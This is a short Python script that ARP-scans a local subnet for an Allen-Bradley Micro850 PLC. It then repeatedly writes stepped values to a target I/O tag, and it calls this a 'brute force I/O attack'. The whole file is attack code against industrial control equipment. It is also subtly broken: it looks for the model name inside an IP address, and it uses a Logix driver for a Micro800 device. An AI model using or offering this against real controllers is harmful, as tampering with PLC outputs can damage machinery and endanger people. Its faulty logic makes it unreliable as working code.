import pycomm3
from pycomm3 import LogixDriver
from scapy.all import ARP, Ether, srp
import time

# Function to discover the IP address of the PLC
def discover_plc_ip():
    # Define the target IP range (e.g., 192.168.1.0/24)
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Parse the response to find the PLC
    for sent, received in result:
        if "Micro850" in received.psrc:
            return received.psrc
    
    return None

# Function to perform the brute force I/O attack
def brute_force_io(plc_ip, tag_name, start_value, end_value, step, delay):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            print(f"Connected to PLC at {plc_ip}")
            
            # Perform the brute force attack
            for value in range(start_value, end_value + 1, step):
                print(f"Setting {tag_name} to {value}")
                plc.write((tag_name, value))
                time.sleep(delay)
                
            print("Brute force I/O attack completed.")
    
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        print("PLC not found. Please check the network configuration.")
        return
    
    # Define the I/O point to target
    tag_name = "TargetIOPoint"
    
    # Define the range and step for the brute force attack
    start_value = 0
    end_value = 100
    step = 1
    delay = 0.5  # Delay between each change in seconds
    
    # Perform the brute force I/O attack
    brute_force_io(plc_ip, tag_name, start_value, end_value, step, delay)

if __name__ == "__main__":
    main()